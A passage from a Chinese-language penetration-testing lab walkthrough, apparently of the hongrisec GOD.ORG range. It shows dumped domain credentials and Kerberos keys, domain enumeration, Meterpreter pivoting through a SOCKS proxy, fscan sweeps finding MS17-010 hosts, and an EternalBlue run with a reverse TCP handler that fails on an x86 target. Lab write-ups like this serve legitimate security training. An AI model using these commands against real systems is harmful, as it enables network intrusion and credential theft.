plain">=================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain  Password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------  --------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  GOD     hongrisec@2020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kerberos credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">====================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain   Password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------   --------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(null)         (null)   (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  GOD.ORG  hongrisec@2020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stu1$          GOD.ORG  55 bb da 11 1c 19 32 70 d5 18 4c a2 19 e7 0d f4 01 b8 fe 7f 75 68 52 f9 7d d9 37 03 87 73 99 bf 8f e7 9f bf 45 00 60 28 69 72 9a 8d 59 f3 f6 01 f8 9b 99 58 fd 58 5b e8 e2 46 b1 5b 34</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         a1 69 bf aa 31 f5 77 d5 78 51 db 45 db f6 c8 9a f0 8e 21 b8 0c 4b 86 b4 ec 11 17 98 e0 4f a9 65 7a 26 bf a8 3a f9 d2 6e af 30 65 e0 68 b1 08 9d 4d 4f 01 47 7d 96 cc 74 97 47 8b 05 a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        6 a4 c6 8c 27 14 7c c4 19 51 9a 2d d6 4b b8 1a 0d 28 05 0c ab 53 16 98 4a 2a bb cd 7e 12 3f b6 a8 fb f6 9d 3d 5a 8b af af 00 66 14 65 ca 85 04 9a 80 8b 13 f5 8f 7a 8c 22 91 ed b2 b7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        a4 b2 a9 21 59 8a e2 9f 23 a7 1b c8 ef d2 c6 ba 80 e8 1f e5 41 04 40 31 9e eb 0a 21 f0 1f 4c 11 aa bd 25 51 64 7b c7 a4 e5 47 08 94 42 46 90 43 06 17 35 5c 0b b4 c4 cc e4 0e</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查看域控信息</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32&gt;net user /domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user /domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The request will be processed at a domain controller for domain god.org.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User accounts for \\owa.god.org</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-------------------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator            Guest                    krbtgt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ligang                   liukaifeng01</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The command completed with one or more errors.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32&gt;net view</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net view</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server Name            Remark</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-------------------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\\OWA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\\ROOT-TVI862UBEH</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The command completed successfully.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32&gt;net time /domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net time /domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Current time at \\owa.god.org is 2024/3/12 22:29:29</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The command completed successfully.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32&gt;net user /domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user /domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The request will be processed at a domain controller for domain god.org.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User accounts for \\owa.god.org</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-------------------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator            Guest                    krbtgt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ligang                   liukaifeng01</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The command completed with one or more errors.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="搭建内网转发">搭建内网转发<a href="#搭建内网转发" class="hash-link" aria-label="搭建内网转发的直接链接" title="搭建内网转发的直接链接">​</a></h2>
<p>直接使用 Metasploit 内建的转发模块</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; run autoroute -s 192.168.52.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Adding a route to 192.168.52.0/255.255.255.0...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Added route to 192.168.52.0/255.255.255.0 via 192.168.200.128</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Use the -p option to list all active routes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; run autoroute -p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Active Routing Table</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">====================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   Subnet             Netmask            Gateway</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ------             -------            -------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   192.168.52.0       255.255.255.0      Session 1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>退出当前会话</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; bg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Backgrounding session 1...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后执行 socks 代理模块</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 auxiliary(server/socks_proxy) &gt; exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Auxiliary module running as background job 0.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Starting the SOCKS proxy server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 auxiliary(server/socks_proxy) &gt; jobs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Jobs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">====</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Id  Name                           Payload  Payload opts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --  ----                           -------  ------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0   Auxiliary: server/socks_proxy</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>成功启动 <code>0.0.0.0:1080</code> 的 socks 代理服务器</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="内网信息搜集">内网信息搜集<a href="#内网信息搜集" class="hash-link" aria-label="内网信息搜集的直接链接" title="内网信息搜集的直接链接">​</a></h2>
<p>保持原先的 Msfconsole 会话，新开一个 Kali Terminal 会话</p>
<p>编辑 <code>/etc/proxychains4.conf</code> 配置文件</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[ProxyList]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># add proxy here ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># meanwile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># defaults set to &quot;tor&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">socks5 127.0.0.1 1080</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后 proxychains 启动 fscan</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains ./tools/fscan-1.8.3/fscan -h 192.168.52.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] config file found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ___                              _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     fscan version: 1.8.3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">trying RunIcmp2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The current user permissions unable to send icmp packets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(icmp) Target 192.168.52.1    is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(icmp) Target 192.168.52.138  is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(icmp) Target 192.168.52.141  is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Icmp alive hosts len is: 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.138:135 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.141:445 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.138:445 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.141:135 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.1:139 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.138:80 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.138:139 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.141:139 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.1:445 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.141:7002 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.1:135 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.141:7001 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.138:88 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.141:21 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.141:8098 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.52.141:8099 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] alive ports len is: 16</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] NetInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*]192.168.52.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]DESKTOP-7HGIVVS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.200.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.56.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.52.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]10.37.171.34</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.137.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] NetInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*]192.168.52.141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]root-tvi862ubeh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.52.141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] NetInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*]192.168.52.138</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]owa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.52.138</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] MS17-010 192.168.52.141     (Windows Server 2003 3790)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] MS17-010 192.168.52.138     (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] NetBios 192.168.52.138  [+] DC:owa.god.org                   Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] ftp 192.168.52.141:21:anonymous</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle https://192.168.52.141:8098 code:401 len:1656   title:You are not authorized to view this page</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://192.168.52.138     code:200 len:689    title:IIS7</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>直接定位到漏洞信息</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[+] MS17-010 192.168.52.141     (Windows Server 2003 3790)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] MS17-010 192.168.52.138     (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] ftp 192.168.52.141:21:anonymous</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="192168200141---eternalblue">192.168.200.141 - EternalBlue<a href="#192168200141---eternalblue" class="hash-link" aria-label="192.168.200.141 - EternalBlue的直接链接" title="192.168.200.141 - EternalBlue的直接链接">​</a></h2>
<p>直接开打</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains msfconsole -q</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; search ms17_010</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Matching Modules</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   #  Name                                      Disclosure Date  Rank     Check  Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   -  ----                                      ---------------  ----     -----  -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/smb/smb_ms17_010</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.52.141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RHOSTS =&gt; 192.168.52.141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on 192.168.200.129:4444</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.52.141:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2003 3790 x86 (32-bit)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.52.141:445 - The target is vulnerable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] 192.168.52.141:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Exploit completed, but no session was created.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>发现 plantform 有点问题，目标机器是 x86 架构的，换一个 payload</p>
